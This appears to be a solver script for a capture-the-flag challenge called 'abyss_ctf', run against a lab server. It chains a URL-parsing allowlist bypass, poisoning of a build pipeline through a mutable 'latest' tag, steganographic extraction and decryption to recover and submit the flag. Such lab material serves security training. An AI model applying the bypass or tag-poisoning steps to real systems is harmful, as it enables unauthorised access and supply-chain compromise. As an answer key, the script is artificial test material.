#!/usr/bin/env python3
import argparse
import hashlib
import json
import random
import string
import sys
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from abyss_ctf.engine import b64u_decode, chacha_decrypt, kdf, lsb_extract_rgb  # noqa: E402


def rand_suffix(n: int = 8) -> str:
    alpha = string.ascii_lowercase + string.digits
    return "".join(random.choice(alpha) for _ in range(n))


def recover_pepper(token: str, vault_cipher: str) -> str:
    data = b64u_decode(vault_cipher)
    mask = hashlib.blake2b(("vault|" + token).encode(), digest_size=32).digest()
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ mask[i % len(mask)])
    return bytes(out).decode()


def solve(base_url: str, team: str):
    base = base_url.rstrip("/")
    reg = requests.post(f"{base}/api/register", json={"team_name": team}, timeout=10)
    reg.raise_for_status()
    data = reg.json()
    if not data.get("ok"):
        raise RuntimeError(json.dumps(data))
    token = data["session"]["token"]
    headers = {"X-Team-Token": token}

    # Stage A with backslash normalization form.
    bypass_url = "https://registry.ctf-trusted.local\\@artifact-vault.ctf.local/bootstrap"
    fr = requests.post(f"{base}/api/gateway/fetch", headers=headers, json={"url": bypass_url}, timeout=10)
    fr.raise_for_status()
    fdata = fr.json()
    if not fdata.get("ok"):
        raise RuntimeError(f"fetch failed: {fdata}")

    # Stage B using 'latest' mutable alias.
    pr = requests.post(
        f"{base}/api/pipeline/run",
        headers=headers,
        json={"mutable_tag": "latest", "pin_sha": ""},
        timeout=10,
    )
    pr.raise_for_status()
    pdata = pr.json()
    if not pdata.get("ok") or not pdata.get("poisoned"):
        raise RuntimeError(f"pipeline poisoning failed: {pdata}")
    tag_digest = pdata["tag_digest"]

    # Variant-B order: pull artifact first, then metadata+pepper, then decrypt.
    art = requests.get(
        f"{base}/api/artifact/carrier",
        headers=headers,
        params={"tag_digest": tag_digest},
        timeout=20,
    )
    art.raise_for_status()
    blob = lsb_extract_rgb(art.content)
    enc = json.loads(blob.decode())

    md = requests.get(f"{base}/api/metadata", headers=headers, timeout=10)
    md.raise_for_status()
    mdj = md.json()
    if not mdj.get("ok"):
        raise RuntimeError(f"metadata unavailable: {mdj}")
    pepper = recover_pepper(token, mdj["vault_cipher"])

    key = kdf(token, pepper, tag_digest)
    aad = f"{token}|{tag_digest}|abyss-2026".encode()
    plain = chacha_decrypt(enc, key, aad)
    final_flag = json.loads(plain.decode())["flag"]

    sub = requests.post(f"{base}/api/submit", headers=headers, json={"flag": final_flag}, timeout=10)
    sub.raise_for_status()
    sdata = sub.json()
    if not sdata.get("ok") or not sdata.get("solved"):
        raise RuntimeError(f"submit fail: {json.dumps(sdata)}")

    print(f"[+] team={team}")
    print(f"[+] token={token}")
    print(f"[+] tag_digest={tag_digest}")
    print(f"[+] final_flag={final_flag}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--team", default=f"teamB_{rand_suffix()}")
    args = ap.parse_args()
    solve(args.base_url, args.team)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[!] solve B failed: {exc}")
        sys.exit(1)
